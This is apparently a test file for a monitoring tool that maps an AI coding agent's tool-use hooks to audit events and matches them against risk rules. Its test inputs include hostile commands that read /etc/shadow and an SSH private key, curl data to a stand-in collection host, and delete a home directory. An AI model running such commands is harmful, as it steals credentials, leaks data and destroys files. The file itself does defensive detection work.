import test from 'node:test';
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';
import {hookEvent, hookAction, normalizeTarget, redact, HOOK_TOOL} from '../src/agent-hook-events.mjs';
import {validateEvent, validateRule, matches, evaluate} from '../src/model.mjs';

const pack = JSON.parse(readFileSync(new URL('../data/risk-rules/ai-agent-baseline.json', import.meta.url), 'utf8'));
const actor = 'claude-code@test-pc', now = new Date();
const agentSource = {id: 'alpha-agent', tenant: 'alpha', kind: 'agent'};
const hook = (name, tool_name, tool_input, extra = {}) => ({hook_event_name: name, session_id: 'b1f0c2d4-1111-2222-3333-444455556666',
  tool_use_id: 'toolu_01ABC', tool_name, tool_input, ...extra});
const rules = pack.rules.map((r, i) => ({...validateRule({id: r.id, title: r.title, field: 'resource', op: 'contains', value: r.value, severity: r.severity},
  {id: 'alpha-reviewer'}, 1), status: 'active'}));
const hits = event => pack.rules.filter(r => matches({field: 'resource', op: 'contains', value: r.value}, event)).map(r => r.id);

test('PreToolUse Bash reading /etc/shadow becomes a valid agent intent the shadow rule matches', () => {
  const event = hookEvent(hook('PreToolUse', 'Bash', {command: 'sudo cat /etc/shadow | head -3'}), {actor, now});
  assert.deepEqual({kind: event.kind, tool: event.tool, action: event.action, status: event.status, traceId: event.traceId, actionId: event.actionId},
    {kind: 'intent', tool: HOOK_TOOL, action: 'shell_exec', status: 'requested', traceId: 'b1f0c2d4-1111-2222-3333-444455556666', actionId: 'toolu_01ABC'});
  assert.equal(event.resource, 'sudo cat /etc/shadow | head -3');
  assert.equal(event.note, '[Bash] sudo cat /etc/shadow | head -3');
  const stored = validateEvent(event, agentSource);
  assert.equal(stored.assurance, 'authenticated_self_report');
  assert.deepEqual(hits(event), ['risk.cred.etc-shadow']);
});

test('PostToolUse becomes a self_report with the outcome under the same action; only the intent carries the target', () => {
  const input = {file_path: 'C:\\Users\\Kim\\.ssh\\id_ed25519'};
  const pre = hookEvent(hook('PreToolUse', 'Read', input), {actor, now});
  const ok = hookEvent(hook('PostToolUse', 'Read', input, {tool_response: {type: 'text'}}), {actor, now});
  const bad = hookEvent(hook('PostToolUse', 'Bash', {command: 'ls'}, {tool_response: {interrupted: true}}), {actor, now});
  assert.equal(ok.kind, 'self_report'); assert.equal(ok.status, 'success'); assert.equal(bad.status, 'failure');
  assert.equal(pre.resource, 'c:/users/kim/.ssh/id_ed25519'); assert.equal(ok.resource, undefined); assert.equal(ok.actionId, pre.actionId);
  assert.notEqual(ok.id, pre.id);
  assert.deepEqual(hits(pre), ['risk.cred.ssh-private-key']); assert.deepEqual(hits(ok), []);
  validateEvent(ok, agentSource); validateEvent(bad, agentSource);
});

test('targets, destinations and action categories per tool', () => {
  const fetch = hookEvent(hook('PreToolUse', 'WebFetch', {url: 'https://Pastebin.com/raw/abc?token=1', prompt: 'x'}), {actor, now});
  assert.equal(fetch.action, 'web_fetch'); assert.equal(fetch.destination, 'pastebin.com'); assert.equal(fetch.resource, 'https://pastebin.com/raw/abc');
  const curl = hookEvent(hook('PreToolUse', 'Bash', {command: 'curl -d @data.json https://collect.example.net/in'}), {actor, now});
  assert.equal(curl.destination, 'collect.example.net'); assert.deepEqual(hits(curl), ['risk.out.curl-data']);
  assert.equal(hookAction('mcp__github__create_issue'), 'mcp_call'); assert.equal(hookAction('Grep'), 'file_search');
  assert.equal(hookAction('Zzz'), 'tool_call');
  assert.equal(hookEvent({hook_event_name: 'UserPromptSubmit', prompt: 'hi'}, {actor}), null);
  assert.equal(hookEvent(hook('PreToolUse', '', {}), {actor}), null);
});

test('no tool_use_id: a stable id from the call itself; odd ids are made safe', () => {
  const raw = {hook_event_name: 'PreToolUse', session_id: 'sess with spaces/ü', tool_name: 'Bash', tool_input: {command: 'rm -rf ~/x'}};
  const a = hookEvent(raw, {actor, now}), b = hookEvent(raw, {actor, now});
  assert.equal(a.id, b.id); assert.match(a.actionId, /^call-[0-9a-f]{16}$/); assert.match(a.traceId, /^[a-zA-Z0-9._:@/-]+$/);
  validateEvent(a, agentSource);
  assert.deepEqual(hits(a), ['risk.destroy.rm-home']);
});

test('secrets in commands are redacted in resource and note', () => {
  const cmd = 'curl -H "Authorization: Bearer abc.def.ghi" https://user:pw123@api.example.com/x --data "password=hunter2"'
    + ' && export OPENAI_API_KEY=sk-abcdefghijklmnopqrstuv && mysql -uroot -pS3cret db';
  const event = hookEvent(hook('PreToolUse', 'Bash', {command: cmd}), {actor, now});
  for (const secret of ['abc.def.ghi', 'pw123', 'hunter2', 'sk-abcdefghijklmnopqrstuv', 'S3cret']) {
    assert.ok(!event.note.includes(secret), `note leaks ${secret}`); assert.ok(!event.resource.includes(secret.toLowerCase()), `resource leaks ${secret}`);
  }
  assert.equal(redact('mkdir -p build/out'), 'mkdir -p build/out');
});

test('control characters and very long commands stay within the ingest limits', () => {
  const event = hookEvent(hook('PreToolUse', 'Bash', {command: 'echo \u0007bell\u202e' + 'x'.repeat(5000)}), {actor, now});
  assert.ok(event.resource.length <= 256 && event.note.length <= 1024);
  validateEvent(event, agentSource);
  assert.equal(normalizeTarget('C:\\Windows\\System32\\config\\SAM'), 'c:/windows/system32/config/sam');
});

test('ordinary development commands raise no risk rule', () => {
  const quiet = ['git status', 'npm test', 'node --test test/a.test.mjs', 'ls -la src', 'rsync -av dist/ build/', 'mysql --database app -e "select 1"',
    'cat README.md', 'python3 -m pip install pandas', 'dd if=/dev/zero of=/dev/null bs=1M count=1', 'git push origin main', 'mkdir -p out'];
  for (const command of quiet) assert.deepEqual(hits(hookEvent(hook('PreToolUse', 'Bash', {command}), {actor, now})), [], command);
});

test('the rule pack is valid restricted DSL with unique ids, and evaluate() reports the matches as custom findings', () => {
  assert.equal(new Set(pack.rules.map(r => r.id)).size, pack.rules.length);
  assert.ok(pack.rules.length <= 100);
  for (const r of pack.rules) assert.equal(r.value, r.value.toLowerCase(), r.id);
  const policyVersion = 'claude-code-monitoring-v1', context = {actor, now, policyVersion};
  const assets = [{actor, tool: HOOK_TOOL, policyVersion, validFrom: '2026-01-01T00:00:00.000Z', destinations: []}];
  const run = (...raws) => evaluate(raws.map(r => validateEvent(hookEvent(r, context), agentSource)), assets, rules, [], now.getTime()).findings;
  const shadow = run(hook('PreToolUse', 'Bash', {command: 'cat /etc/shadow'}), hook('PostToolUse', 'Bash', {command: 'cat /etc/shadow'}, {tool_response: {}}));
  assert.deepEqual(shadow.map(f => [f.code, f.severity]), [['CUSTOM:risk.cred.etc-shadow:v1', 'high']]);
  // A registered agent fetching a URL with no rule match raises nothing: no authority/approval findings for agent-source records,
  // and the asset's policy version gives the destination its policy context.
  const fetchInput = {url: 'https://docs.example.org/a'};
  assert.deepEqual(run(hook('PreToolUse', 'WebFetch', fetchInput), hook('PostToolUse', 'WebFetch', fetchInput, {tool_response: {}})), []);
  // Without a registration the same call is an unregistered asset.
  const ls = validateEvent(hookEvent(hook('PreToolUse', 'Bash', {command: 'ls'}), context), agentSource);
  const unregistered = evaluate([ls], [], rules, [], now.getTime()).findings;
  assert.deepEqual(unregistered.map(f => f.code), ['UNREGISTERED_ASSET']);
});
